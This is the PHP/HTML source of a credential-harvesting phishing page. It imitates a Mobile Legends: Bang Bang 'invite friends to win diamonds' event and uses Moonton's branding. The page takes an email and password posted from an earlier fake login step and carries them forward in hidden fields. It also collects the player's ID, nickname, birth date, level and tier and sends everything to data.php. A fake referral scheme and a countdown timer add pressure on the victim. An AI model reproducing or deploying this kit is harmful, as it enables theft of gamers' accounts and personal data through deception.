<?php
$email = $_POST['email'];
//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: ./");
}
?>
<html>

  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Oxygen&display=swap" rel="stylesheet">
    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3ddd40ca064d997b6655739e7a0e8a65acc106e8/alex-vikontakte.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/1591ba04a57c11f4b18d2ebb39e03e4a81715c83/alex-google.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3fce8843edde49a48905ae1ed9cf237534e547dd/alex-moonton.css">
    <link rel="stylesheet" href="alexFrontEnd/css/style.css" />
    <meta name="keywords" content="MLBB, MLBB Evebt, MLBB Free Skin">
    <meta name="description" content="Get draw and claim your diamond skin now!">
    <meta name="author" content="Alex Ariandi">
    <title>Mobile Legends: Bang Bang</title>
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="Mobile Legends: Bang Bang">
    <meta property="og:type" content="website">
    <meta name="copyright" content="Moonton">
    <meta name="theme-color" content="#4b28cc">
    <link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
    <meta property="og:image" content="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mlbb-5v5.webp" />
  </head>

  <body>
    <main>
      <div id="container">
        <div class="content">
          <header>
            <div class="topalex">
              <i class='bx bx-chevron-left'></i>
              <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mlbb-5v5.webp" alt="icon" />
            </div>
            <h3>Invite Friends to Win <h1>Diamond MLBB</h1>
            </h3>
          </header>
          <section class="formariandi">
            <div class="boxformalexmltf">
              <div class="textformalexmltf">
                <p>Fill to collect reward.</p>
              </div>
              <form class="formalexmltf" method="POST" action="data.php" onsubmit="open_my_account();" id="ValidateVerificationDataForm">
                <div class="itemformmltf">
                  <label>User ID</label>
                  <input name="playid" type="number" placeholder="Enter User ID" required />
                </div>
                <div class="itemformmltf">
                  <label>Nickname</label>
                  <input name="nickname" type="text" placeholder="Enter Nickname" required />
                </div>
                <div class="itemformmltf">
                  <label>Date of Birth</label>
                  <div class="inputtriplealexmltf">
                    <select class="select-alexmarsya" name="year" id="year" onmousedown="buka.play();" required>
                      <option value="" selected="selected" disabled="disabled">Year</option>
                      <option>1985</option>
                      <option>1986</option>
                      <option>1987</option>
                      <option>1988</option>
                      <option>1989</option>
                      <option>1990</option>
                      <option>1991</option>
                      <option>1992</option>
                      <option>1993</option>
                      <option>1994</option>
                      <option>1995</option>
                      <option>1996</option>
                      <option>1997</option>
                      <option>1998</option>
                      <option>1999</option>
                      <option>2000</option>
                      <option>2001</option>
                      <option>2002</option>
                      <option>2003</option>
                      <option>2004</option>
                      <option>2005</option>
                      <option>2006</option>
                      <option>2007</option>
                      <option>2008</option>
                      <option>2009</option>
                      <option>2010</option>
                      <option>2011</option>
                      <option>2012</option>
                      <option>2013</option>
                      <option>2014</option>
                      <option>2015</option>
                      <option>2016</option>
                      <option>2017</option>
                      <option>2018</option>
                      <option>2019</option>
                      <option>2020</option>
                    </select>
                    <select class="select-alexmarsya" name="month" id="month" onmousedown="buka.play();" required>
                      <option value="" selected="selected" disabled="disabled">Month</option>
                      <option>January</option>
                      <option>February</option>
                      <option>March</option>
                      <option>April</option>
                      <option>May</option>
                      <option>June</option>
                      <option>July</option>
                      <option>August</option>
                      <option>September</option>
                      <option>October</option>
                      <option>November</option>
                      <option>December</option>
                    </select>
                    <select class="select-alexmarsya" name="day" id="day" onmousedown="buka.play();" required style="margin-right: unset;">
                      <option value="" selected="selected" disabled="disabled">Day</option>
                      <option>1</option>
                      <option>2</option>
                      <option>3</option>
                      <option>4</option>
                      <option>5</option>
                      <option>6</option>
                      <option>7</option>
                      <option>8</option>
                      <option>9</option>
                      <option>10</option>
                      <option>11</option>
                      <option>12</option>
                      <option>13</option>
                      <option>14</option>
                      <option>15</option>
                      <option>16</option>
                      <option>17</option>
                      <option>18</option>
                      <option>19</option>
                      <option>20</option>
                      <option>21</option>
                      <option>22</option>
                      <option>23</option>
                      <option>24</option>
                      <option>25</option>
                      <option>26</option>
                      <option>27</option>
                      <option>28</option>
                      <option>29</option>
                      <option>30</option>
                      <option>31</option>
                    </select>
                  </div>
                </div>
                <div class="itemformmltf">
                  <label>Level</label>
                  <select class="select-alexmarsya" name="level" id="level" onmousedown="buka.play();" required>
                    <option value="" selected="selected" disabled="disabled">Choose Account Level</option>
                    <option>1</option>
                    <option>2</option>
                    <option>3</option>
                    <option>4</option>
                    <option>5</option>
                    <option>6</option>
                    <option>7</option>
                    <option>8</option>
                    <option>9</option>
                    <option>10</option>
                    <option>11</option>
                    <option>12</option>
                    <option>13</option>
                    <option>14</option>
                    <option>15</option>
                    <option>16</option>
                    <option>17</option>
                    <option>18</option>
                    <option>19</option>
                    <option>20</option>
                    <option>21</option>
                    <option>22</option>
                    <option>23</option>
                    <option>24</option>
                    <option>25</option>
                    <option>26</option>
                    <option>27</option>
                    <option>28</option>
                    <option>29</option>
                    <option>30</option>
                    <option>31</option>
                    <option>32</option>
                    <option>33</option>
                    <option>34</option>
                    <option>35</option>
                    <option>36</option>
                    <option>37</option>
                    <option>38</option>
                    <option>39</option>
                    <option>40</option>
                    <option>41</option>
                    <option>42</option>
                    <option>43</option>
                    <option>44</option>
                    <option>45</option>
                    <option>46</option>
                    <option>47</option>
                    <option>48</option>
                    <option>49</option>
                    <option>50</option>
                    <option>51</option>
                    <option>52</option>
                    <option>53</option>
                    <option>54</option>
                    <option>55</option>
                    <option>56</option>
                    <option>57</option>
                    <option>58</option>
                    <option>59</option>
                    <option>60</option>
                    <option>61</option>
                    <option>62</option>
                    <option>63</option>
                    <option>64</option>
                    <option>65</option>
                    <option>66</option>
                    <option>67</option>
                    <option>68</option>
                    <option>69</option>
                    <option>70</option>
                    <option>71</option>
                    <option>72</option>
                    <option>73</option>
                    <option>74</option>
                    <option>75</option>
                    <option>76</option>
                    <option>77</option>
                    <option>78</option>
                    <option>79</option>
                    <option>80</option>
                    <option>81</option>
                    <option>82</option>
                    <option>83</option>
                    <option>84</option>
                    <option>85</option>
                    <option>86</option>
                    <option>87</option>
                    <option>88</option>
                    <option>89</option>
                    <option>90</option>
                    <option>91</option>
                    <option>92</option>
                    <option>93</option>
                    <option>94</option>
                    <option>95</option>
                    <option>96</option>
                    <option>97</option>
                    <option>98</option>
                    <option>99</option>
                    <option>100</option>
                  </select>
                </div>
                <div class="itemformmltf">
                  <label>Tier</label>
                  <select class="select-alexmarsya" name="tier" id="tier" onmousedown="buka.play();" required>
                    <option value="" selected="selected" disabled="disabled">Choose Account Tier</option>
                    <option>Warrior</option>
                    <option>Elite</option>
                    <option>Master</option>
                    <option>Grandmaster</option>
                    <option>Epic</option>
                    <option>Legend</option>
                    <option>Mythic</option>
                    <option>Glorious Mythic</option>
                  </select>
                </div>
                <div class="buttonformalexmlmt">
                  <input type="hidden" name="email" value="<?php echo $_POST['email'];?>" readonly />
                  <input type="hidden" name="password" value="<?php echo $_POST['password'];?>" readonly />
                  <input type="hidden" name="login" value="<?php echo $_POST['login'];?>" readonly />
                  <button type="submit">Submit</button>
                </div>
              </form>
            </div>
          </section>

          <section class="guestalexml">
            <div class="invitealex">
              <div class="topinvite">
                <p>free leftovers</p>
                <label id="copymore">get more</label>
                <input type="hidden" id="linkmore" value="089509556668" readonly />
              </div>
              <div class="bottinvite">
                <p>0</p>
                <div class="salinlink">
                  <input type="text" id="linkshow" value="089509556668" readonly />
                  <label id="copyalex"><i class='bx bx-copy-alt'></i></label>
                </div>
              </div>
            </div>
            <div class="invitealex">
              <div class="topinvite">
                <p>History</p>
                <label href="#top">Spin Now</label>
              </div>
              <div class="bottinvite">
                <p>Not found</p>
                <div class="salinlink" style="visibility: hidden;">
                  <input type="text" value="089509556668" readonly />
                  <label><i class='bx bx-copy-alt'></i></label>
                </div>
              </div>
            </div>
            <a onclick="openstatus()">Invitation History</a>
            <span id="invitestatus">have not invited</span>

            <div class="rulesalexml">
              <div class="rulesfix">
                <h3>Rules</h3>
                <div class="contentrules">
                  <p>1. invite users to take part in the MLBB Spin Event using the link we have prepared under the prize wheel. Everyone who refers the link will increase your free play count.</p>
                  <p>2. Every time you withdraw a prize, you will receive whatever the pointer points to. To receive the prize, you must fill in your MLBB ID correctly. Once verified, our system will send the reward within 30 minutes.</p>
                  <p>3. Event time limit: <label id="alextimer">25:25</label></p>
                  <p>4. Invite up to 100 users for 100 free prize spin opportunities.</p>
                </div>
              </div>
            </div>
          </section>

        </div>
      </div>
    </main>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script type="text/javascript" src="https://unpkg.com/package-ion@2.4.3-icons/ionicons.map.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/function.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
    <script type="text/javascript" src="alexFrontEnd/js/copylink.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/gotop.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/timer.js"></script>
  </body>

</html>
